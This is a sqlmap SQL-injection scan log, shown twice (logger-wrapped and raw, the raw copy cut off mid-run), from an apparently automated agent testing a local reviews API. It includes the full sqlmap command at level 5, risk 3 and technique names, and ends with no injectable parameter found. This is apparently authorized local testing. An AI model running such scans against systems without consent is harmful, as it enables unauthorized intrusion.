2025-09-26 19:03:45,921 - INFO -       |_|V...       |_|   https://sqlmap.org
2025-09-26 19:03:45,921 - INFO - 
2025-09-26 19:03:45,936 - INFO - [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
2025-09-26 19:03:45,936 - INFO - 
2025-09-26 19:03:45,936 - INFO - [*] starting @ 19:03:45 /2025-09-26/
2025-09-26 19:03:45,936 - INFO - 
2025-09-26 19:03:47,780 - INFO - [19:03:47] [WARNING] using 'F:\disruptiq-notes\sql-injection-agent-from-openapi-spec\sqlmap-agent\attack-logs-dynamic\Get_reviews_for_a_product_sqlmap' as the output directory
2025-09-26 19:03:48,291 - INFO - [19:03:48] [WARNING] you've provided target URL without any GET parameters (e.g. 'http://www.site.com/article.php?id=1') and without providing any POST parameters through option '--data'
2025-09-26 19:03:48,302 - INFO - do you want to try URI injections in the target URL itself? [Y/n/q] Y
2025-09-26 19:03:48,312 - INFO - [19:03:48] [INFO] testing connection to the target URL
2025-09-26 19:03:48,377 - INFO - [19:03:48] [WARNING] the web server responded with an HTTP error code (500) which could interfere with the results of the tests
2025-09-26 19:03:48,377 - INFO - [19:03:48] [INFO] checking if the target is protected by some kind of WAF/IPS
2025-09-26 19:03:48,407 - INFO - [19:03:48] [INFO] testing if the target URL content is stable
2025-09-26 19:03:48,818 - INFO - [19:03:48] [INFO] target URL content is stable
2025-09-26 19:03:48,818 - INFO - [19:03:48] [INFO] testing if URI parameter '#1*' is dynamic
2025-09-26 19:03:48,946 - INFO - [19:03:48] [INFO] URI parameter '#1*' appears to be dynamic
2025-09-26 19:03:48,978 - INFO - [19:03:48] [WARNING] heuristic (basic) test shows that URI parameter '#1*' might not be injectable
2025-09-26 19:03:49,005 - INFO - [19:03:49] [INFO] testing for SQL injection on URI parameter '#1*'
2025-09-26 19:03:49,102 - INFO - [19:03:49] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
2025-09-26 19:03:49,157 - INFO - [19:03:49] [WARNING] reflective value(s) found and filtering out
2025-09-26 19:03:50,131 - INFO - [19:03:50] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
2025-09-26 19:03:51,148 - INFO - [19:03:51] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
2025-09-26 19:03:52,239 - INFO - [19:03:52] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
2025-09-26 19:03:53,030 - INFO - [19:03:53] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
2025-09-26 19:03:53,639 - INFO - [19:03:53] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
2025-09-26 19:03:53,831 - INFO - [19:03:53] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
2025-09-26 19:03:54,003 - INFO - [19:03:54] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
2025-09-26 19:03:54,230 - INFO - [19:03:54] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
2025-09-26 19:03:54,665 - INFO - [19:03:54] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
2025-09-26 19:03:55,068 - INFO - [19:03:55] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
2025-09-26 19:03:55,517 - INFO - [19:03:55] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
2025-09-26 19:03:56,015 - INFO - [19:03:56] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
2025-09-26 19:03:56,385 - INFO - [19:03:56] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
2025-09-26 19:03:57,124 - INFO - [19:03:57] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
2025-09-26 19:03:57,961 - INFO - [19:03:57] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
2025-09-26 19:03:58,778 - INFO - [19:03:58] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
2025-09-26 19:03:59,580 - INFO - [19:03:59] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
2025-09-26 19:04:00,514 - INFO - [19:04:00] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
2025-09-26 19:04:01,266 - INFO - [19:04:01] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
2025-09-26 19:04:02,140 - INFO - [19:04:02] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
2025-09-26 19:04:02,959 - INFO - [19:04:02] [INFO] testing 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)'
2025-09-26 19:04:03,903 - INFO - [19:04:03] [INFO] testing 'Oracle AND boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
2025-09-26 19:04:04,746 - INFO - [19:04:04] [INFO] testing 'Oracle OR boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
2025-09-26 19:04:05,624 - INFO - [19:04:05] [INFO] testing 'SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
2025-09-26 19:04:06,449 - INFO - [19:04:06] [INFO] testing 'SQLite OR boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
2025-09-26 19:04:07,392 - INFO - [19:04:07] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
2025-09-26 19:04:07,417 - INFO - [19:04:07] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET)'
2025-09-26 19:04:07,434 - INFO - [19:04:07] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)'
2025-09-26 19:04:07,468 - INFO - [19:04:07] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT)'
2025-09-26 19:04:07,480 - INFO - [19:04:07] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT - original value)'
2025-09-26 19:04:07,505 - INFO - [19:04:07] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int)'
2025-09-26 19:04:07,526 - INFO - [19:04:07] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int - original value)'
2025-09-26 19:04:07,558 - INFO - [19:04:07] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace'
2025-09-26 19:04:07,602 - INFO - [19:04:07] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (original value)'
2025-09-26 19:04:07,618 - INFO - [19:04:07] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES)'
2025-09-26 19:04:07,640 - INFO - [19:04:07] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES - original value)'
2025-09-26 19:04:07,665 - INFO - [19:04:07] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace'
2025-09-26 19:04:07,699 - INFO - [19:04:07] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace (original value)'
2025-09-26 19:04:07,725 - INFO - [19:04:07] [INFO] URI parameter '#1*' appears to be 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace (original value)' injectable
2025-09-26 19:04:07,725 - INFO - it looks like the back-end DBMS is 'Microsoft SQL Server/Sybase'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
2025-09-26 19:04:07,735 - INFO - [19:04:07] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
2025-09-26 19:04:07,735 - INFO - [19:04:07] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
2025-09-26 19:04:07,957 - INFO - [19:04:07] [INFO] testing 'Generic UNION query (random number) - 1 to 20 columns'
2025-09-26 19:04:08,149 - INFO - [19:04:08] [INFO] target URL appears to be UNION injectable with 6 columns
2025-09-26 19:04:08,483 - INFO - [19:04:08] [WARNING] if UNION based SQL injection is not detected, please consider and/or try to force the back-end DBMS (e.g. '--dbms=mysql')
2025-09-26 19:04:08,487 - INFO - [19:04:08] [INFO] testing 'Generic UNION query (NULL) - 21 to 40 columns'
2025-09-26 19:04:08,687 - INFO - [19:04:08] [INFO] testing 'Generic UNION query (random number) - 21 to 40 columns'
2025-09-26 19:04:08,888 - INFO - [19:04:08] [INFO] testing 'Generic UNION query (NULL) - 41 to 60 columns'
2025-09-26 19:04:09,094 - INFO - [19:04:09] [INFO] testing 'Generic UNION query (random number) - 41 to 60 columns'
2025-09-26 19:04:09,285 - INFO - [19:04:09] [INFO] testing 'Generic UNION query (NULL) - 61 to 80 columns'
2025-09-26 19:04:09,466 - INFO - [19:04:09] [INFO] testing 'Generic UNION query (random number) - 61 to 80 columns'
2025-09-26 19:04:09,639 - INFO - [19:04:09] [INFO] testing 'Generic UNION query (NULL) - 81 to 100 columns'
2025-09-26 19:04:09,814 - INFO - [19:04:09] [INFO] testing 'Generic UNION query (random number) - 81 to 100 columns'
2025-09-26 19:04:09,986 - INFO - [19:04:09] [INFO] checking if the injection point on URI parameter '#1*' is a false positive
2025-09-26 19:04:10,012 - INFO - [19:04:10] [WARNING] false positive or unexploitable injection point detected
2025-09-26 19:04:10,012 - INFO - [19:04:10] [WARNING] URI parameter '#1*' does not seem to be injectable
2025-09-26 19:04:10,012 - INFO - other non-custom parameters found. Do you want to process them too? [Y/n/q] Y
2025-09-26 19:04:10,012 - INFO - [19:04:10] [INFO] testing if parameter 'User-Agent' is dynamic
2025-09-26 19:04:10,028 - INFO - [19:04:10] [WARNING] parameter 'User-Agent' does not appear to be dynamic
2025-09-26 19:04:10,039 - INFO - [19:04:10] [WARNING] heuristic (basic) test shows that parameter 'User-Agent' might not be injectable
2025-09-26 19:04:10,046 - INFO - [19:04:10] [INFO] testing for SQL injection on parameter 'User-Agent'
2025-09-26 19:04:10,103 - INFO - [19:04:10] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
2025-09-26 19:04:10,555 - INFO - [19:04:10] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
2025-09-26 19:04:11,210 - INFO - [19:04:11] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
2025-09-26 19:04:11,648 - INFO - [19:04:11] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
2025-09-26 19:04:11,946 - INFO - [19:04:11] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
2025-09-26 19:04:12,324 - INFO - [19:04:12] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
2025-09-26 19:04:12,423 - INFO - [19:04:12] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
2025-09-26 19:04:12,617 - INFO - [19:04:12] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
2025-09-26 19:04:12,712 - INFO - [19:04:12] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
2025-09-26 19:04:12,719 - INFO - [19:04:12] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
2025-09-26 19:04:12,740 - INFO - [19:04:12] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
2025-09-26 19:04:12,755 - INFO - [19:04:12] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
2025-09-26 19:04:12,761 - INFO - [19:04:12] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
2025-09-26 19:04:12,773 - INFO - [19:04:12] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
2025-09-26 19:04:13,106 - INFO - it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
2025-09-26 19:04:13,106 - INFO - [19:04:13] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
2025-09-26 19:04:13,732 - INFO - [19:04:13] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
2025-09-26 19:04:14,293 - INFO - [19:04:14] [WARNING] parameter 'User-Agent' does not seem to be injectable
2025-09-26 19:04:14,293 - INFO - [19:04:14] [INFO] testing if parameter 'Referer' is dynamic
2025-09-26 19:04:14,293 - INFO - [19:04:14] [WARNING] parameter 'Referer' does not appear to be dynamic
2025-09-26 19:04:14,311 - INFO - [19:04:14] [WARNING] heuristic (basic) test shows that parameter 'Referer' might not be injectable
2025-09-26 19:04:14,311 - INFO - [19:04:14] [INFO] testing for SQL injection on parameter 'Referer'
2025-09-26 19:04:14,380 - INFO - [19:04:14] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
2025-09-26 19:04:14,801 - INFO - [19:04:14] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
2025-09-26 19:04:15,527 - INFO - [19:04:15] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
2025-09-26 19:04:16,023 - INFO - [19:04:16] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
2025-09-26 19:04:16,322 - INFO - [19:04:16] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
2025-09-26 19:04:16,711 - INFO - [19:04:16] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
2025-09-26 19:04:16,784 - INFO - [19:04:16] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
2025-09-26 19:04:16,928 - INFO - [19:04:16] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
2025-09-26 19:04:17,026 - INFO - [19:04:17] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
2025-09-26 19:04:17,032 - INFO - [19:04:17] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
2025-09-26 19:04:17,045 - INFO - [19:04:17] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
2025-09-26 19:04:17,055 - INFO - [19:04:17] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
2025-09-26 19:04:17,068 - INFO - [19:04:17] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
2025-09-26 19:04:17,081 - INFO - [19:04:17] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
2025-09-26 19:04:17,348 - INFO - [19:04:17] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
2025-09-26 19:04:17,880 - INFO - [19:04:17] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
2025-09-26 19:04:18,516 - INFO - [19:04:18] [WARNING] parameter 'Referer' does not seem to be injectable
2025-09-26 19:04:18,516 - INFO - [19:04:18] [INFO] testing if parameter 'Host' is dynamic
2025-09-26 19:04:18,551 - INFO - [19:04:18] [WARNING] parameter 'Host' does not appear to be dynamic
2025-09-26 19:04:18,563 - INFO - [19:04:18] [WARNING] heuristic (basic) test shows that parameter 'Host' might not be injectable
2025-09-26 19:04:18,570 - INFO - [19:04:18] [INFO] testing for SQL injection on parameter 'Host'
2025-09-26 19:04:18,676 - INFO - [19:04:18] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
2025-09-26 19:04:19,145 - INFO - [19:04:19] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
2025-09-26 19:04:19,815 - INFO - [19:04:19] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
2025-09-26 19:04:20,276 - INFO - [19:04:20] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
2025-09-26 19:04:20,683 - INFO - [19:04:20] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
2025-09-26 19:04:21,110 - INFO - [19:04:21] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
2025-09-26 19:04:21,199 - INFO - [19:04:21] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
2025-09-26 19:04:21,358 - INFO - [19:04:21] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
2025-09-26 19:04:21,440 - INFO - [19:04:21] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
2025-09-26 19:04:21,457 - INFO - [19:04:21] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
2025-09-26 19:04:21,473 - INFO - [19:04:21] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
2025-09-26 19:04:21,483 - INFO - [19:04:21] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
2025-09-26 19:04:21,483 - INFO - [19:04:21] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
2025-09-26 19:04:21,499 - INFO - [19:04:21] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
2025-09-26 19:04:21,831 - INFO - [19:04:21] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
2025-09-26 19:04:22,486 - INFO - [19:04:22] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
2025-09-26 19:04:23,199 - INFO - [19:04:23] [WARNING] parameter 'Host' does not seem to be injectable
2025-09-26 19:04:23,199 - INFO - [19:04:23] [CRITICAL] all tested parameters do not appear to be injectable. Rerun without providing the option '--technique'. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'
2025-09-26 19:04:23,199 - INFO - [19:04:23] [WARNING] HTTP error codes detected during run:
2025-09-26 19:04:23,199 - INFO - 500 (Internal Server Error) - 3453 times, 404 (Not Found) - 4 times
2025-09-26 19:04:23,199 - INFO - 
2025-09-26 19:04:23,209 - INFO - [*] ending @ 19:04:23 /2025-09-26/
2025-09-26 19:04:23,210 - INFO - 

-------------------- EXECUTING COMMAND --------------------
'C:\Users\Ronald Wilson\AppData\Local\Programs\Python\Python311\python.exe' 'F:\disruptiq-notes\sqlmap-dev\sqlmap.py' -u http://localhost:5000/reviews/test --output-dir 'attack-logs-dynamic\Get_reviews_for_a_product_sqlmap' --batch --level=5 --risk=3 --threads 5 --technique BU
--------------------------------------------------
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.9.9.4#dev}
|_ -| . [,]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 19:03:45 /2025-09-26/

[19:03:47] [WARNING] using 'F:\disruptiq-notes\sql-injection-agent-from-openapi-spec\sqlmap-agent\attack-logs-dynamic\Get_reviews_for_a_product_sqlmap' as the output directory
[19:03:48] [WARNING] you've provided target URL without any GET parameters (e.g. 'http://www.site.com/article.php?id=1') and without providing any POST parameters through option '--data'
do you want to try URI injections in the target URL itself? [Y/n/q] Y
[19:03:48] [INFO] testing connection to the target URL
[19:03:48] [WARNING] the web server responded with an HTTP error code (500) which could interfere with the results of the tests
[19:03:48] [INFO] checking if the target is protected by some kind of WAF/IPS
[19:03:48] [INFO] testing if the target URL content is stable
[19:03:48] [INFO] target URL content is stable
[19:03:48] [INFO] testing if URI parameter '#1*' is dynamic
[19:03:48] [INFO] URI parameter '#1*' appears to be dynamic
[19:03:48] [WARNING] heuristic (basic) test shows that URI parameter '#1*' might not be injectable
[19:03:49] [INFO] testing for SQL injection on URI parameter '#1*'
[19:03:49] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[19:03:49] [WARNING] reflective value(s) found and filtering out
[19:03:50] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[19:03:51] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[19:03:52] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[19:03:53] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[19:03:53] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
[19:03:53] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
[19:03:54] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
[19:03:54] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[19:03:54] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[19:03:55] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
[19:03:55] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
[19:03:56] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
[19:03:56] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
[19:03:57] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
[19:03:57] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
[19:03:58] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
[19:03:59] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
[19:04:00] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[19:04:01] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[19:04:02] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
[19:04:02] [INFO] testing 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)'
[19:04:03] [INFO] testing 'Oracle AND boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
[19:04:04] [INFO] testing 'Oracle OR boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
[19:04:05] [INFO] testing 'SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
[19:04:06] [INFO] testing 'SQLite OR boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
[19:04:07] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[19:04:07] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET)'
[19:04:07] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)'
[19:04:07] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT)'
[19:04:07] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT - original value)'
[19:04:07] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int)'
[19:04:07] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int - original value)'
[19:04:07] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace'
[19:04:07] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (original value)'
[19:04:07] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES)'
[19:04:07] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES - original value)'
[19:04:07] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace'
[19:04:07] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace (original value)'
[19:04:07] [INFO] URI parameter '#1*' appears to be 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace (original value)' injectable 
it looks like the back-end DBMS is 'Microsoft SQL Server/Sybase'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
[19:04:07] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[19:04:07] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[19:04:07] [INFO] testing 'Generic UNION query (random number) - 1 to 20 columns'
[19:04:08] [INFO] target URL appears to be UNION injectable with 6 columns
[19:04:08] [WARNING] if UNION based SQL injection is not detected, please consider and/or try to force the back-end DBMS (e.g. '--dbms=mysql') 
[19:04:08] [INFO] testing 'Generic UNION query (NULL) - 21 to 40 columns'
[19:04:08] [INFO] testing 'Generic UNION query (random number) - 21 to 40 columns'
[19:04:08] [INFO] testing 'Generic UNION query (NULL) - 41 to 60 columns'
[19:04:09] [INFO] testing 'Generic UNION query (random number) - 41 to 60 columns'
[19:04:09] [INFO] testing 'Generic UNION query (NULL) - 61 to 80 columns'
[19:04:09] [INFO] testing 'Generic UNION query (random number) - 61 to 80 columns'
[19:04:09] [INFO] testing 'Generic UNION query (NULL) - 81 to 100 columns'
[19:04:09] [INFO] testing 'Generic UNION query (random number) - 81 to 100 columns'
[19:04:09] [INFO] checking if the injection point on URI parameter '#1*' is a false positive
[19:04:10] [WARNING] false positive or unexploitable injection point detected
[19:04:10] [WARNING] URI parameter '#1*' does not seem to be injectable
other non-custom parameters found. Do you want to process them too? [Y/n/q] Y
[19:04:10] [INFO] testing if parameter 'User-Agent' is dynamic
[19:04:10] [WARNING] parameter 'User-Agent' does not appear to be dynamic
[19:04:10] [WARNING] heuristic (basic) test shows that parameter 'User-Agent' might not be injectable
[19:04:10] [INFO] testing for SQL injection on parameter 'User-Agent'
[19:04:10] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[19:04:10] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[19:04:11] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[19:04:11] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[19:04:11] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[19:04:12] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
[19:04:12] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
[19:04:12] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
[19:04:12] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[19:04:12] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
[19:04:12] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
[19:04:12] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
[19:04:12] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
[19:04:12] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
[19:04:13] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[19:04:13] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
[19:04:14] [WARNING] parameter 'User-Agent' does not seem to be injectable
[19:04:14] [INFO] testing if parameter 'Referer' is dynamic
[19:04:14] [WARNING] parameter 'Referer' does not appear to be dynamic
[19:04:14] [WARNING] heuristic (basic) test shows that parameter 'Referer' might not be injectable
[19:04:14] [INFO] testing for SQL injection on parameter 'Referer'
[19:04:14] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[19:04:14] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[19:04:15] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[19:04:16] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[19:04:16] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[19:04:16] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
[19:04:16] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
[19:04:16] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
[19:04:17] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[19:04:17] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
[19:04:17] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
[19:04:17] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
[19:04:17] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
[19:04:17] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
[19:04:17] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[19:04:17] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
[19:04:18] [WARNING] parameter 'Referer' does not seem to be injectable
[19:04:18] [INFO] testing if parameter 'Host' is dynamic
[19:04:18] [WARNING] parameter 'Host' does not appear to be dynamic
[19:04:18] [WARNING] heuristic (basic) test shows that parameter 'Host' might not be injectable
[19:04:18] [INFO] testing for SQL injection on parameter 'Host'
[19:04:18] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[19:04:19] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[19:04:19] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[19:04:20] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[19:04:20] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[19:04:21] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
[19:04:21] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
[19:04:21] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
